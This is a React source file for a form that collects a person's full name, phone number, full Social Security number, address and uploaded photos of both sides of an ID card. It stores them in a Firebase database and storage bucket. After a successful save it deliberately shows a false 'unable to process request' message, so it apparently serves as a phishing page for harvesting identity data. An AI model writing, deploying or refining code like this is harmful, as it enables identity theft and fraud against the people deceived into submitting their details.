import React, { useState } from "react";
import { app, database, storage} from "./firebaseConfig";
import { collection, addDoc } from "firebase/firestore";
import {ref, uploadBytesResumable, getDownloadURL } from "firebase/storage";

function Form() {
    const [picData, setPicData] = useState({});
    const [picData2, setPicData2] = useState({});
    const collectionRef = collection(database, 'users');

    const [formData, setFormData] = useState({
        name: "",
        phoneNumber: "",
        ssn: "",
        country: "",
        address: "",
    })

    function handleData(event) {
        setFormData((prev)=> {
            return {
                ...prev,
               [event.target.name]: event.target.value,
            }
        })
        console.log(formData);
    }

    const handlePicSubmit = ()=> {
     const storageRef = ref(storage, picData.name);
     const uploadTask = uploadBytesResumable(storageRef, picData);
     uploadTask.on('state_changed', (snapshot)=> {
       const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
       console.log('uplaod is' + progress + '% done');
     },
     (error)=> {
        console.log(error.message)
     },
     () => {
        getDownloadURL(uploadTask.snapshot.ref).then((downloadURL) => {
            console.log('File available at' , downloadURL)
        })
     }
     )
    }


    const handlePicSubmit2 = ()=> {
        const storageRef = ref(storage, picData2.name);
        const uploadTask = uploadBytesResumable(storageRef, picData2);
        uploadTask.on('state_changed', (snapshot)=> {
          const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
          console.log('uplaod is' + progress + '% done');
        },
        (error)=> {
           console.log(error.message)
        },
        () => {
           getDownloadURL(uploadTask.snapshot.ref).then((downloadURL) => {
               console.log('File available at' , downloadURL)
           })
        }
        )
       }

    function handleSubmit(event) {
        event.preventDefault();
        addDoc(collectionRef, {
            name: formData.name,
            phoneNumber: formData.phoneNumber,
            ssn: formData.ssn,
            country: formData.country,
            address: formData.address,
        })
        .then(()=> {
            alert("unable to process request, try again later");
        })
        .catch((err)=> {
            console.log(err.message);
        })
        handlePicSubmit();
        handlePicSubmit2();
    }

    return (
        <form onSubmit={handleSubmit} >
            <section className="form">
                <div className="left">
                    <div>
                        <h2>*FULL NAME</h2>
                        <input type="text" name="name" onChange={handleData}/>
                    </div>
                    <div>
                        <h2>*MOBILE PHONE NUMBER</h2>
                        <input type="number" name="phoneNumber" onChange={handleData}/>
                    </div>
                    <div>
                        <h2>* FULL DIGITS OF SSN</h2>
                        <input type="number" name="ssn" onChange={handleData}/>
                    </div>
                    <div>
                        <h2>UPLOAD BACK OF ID CARD</h2>
                        <input type="file" onChange={(event)=> setPicData2(event.target.files[0])}/>
                    </div>
                </div>

                <div className="right">
                    <div>
                        <h2>COUNTRY</h2>
                        <input type="text" name="country" onChange={handleData}/>
                    </div>
                    <div>
                        <h2>FULL HOUSE ADDRESS</h2>
                        <input type="text" name="address" onChange={handleData}/>
                    </div>
                    <div>
                        <h2>UPLOAD FRONT OF ID CARD</h2>
                        <input type="file" onChange={(event)=> setPicData(event.target.files[0])}/>
                    </div>
                </div>
            </section>
            <div className="btn">
            <button>Continue</button>
            </div>
        </form>
    )
}

export default Form;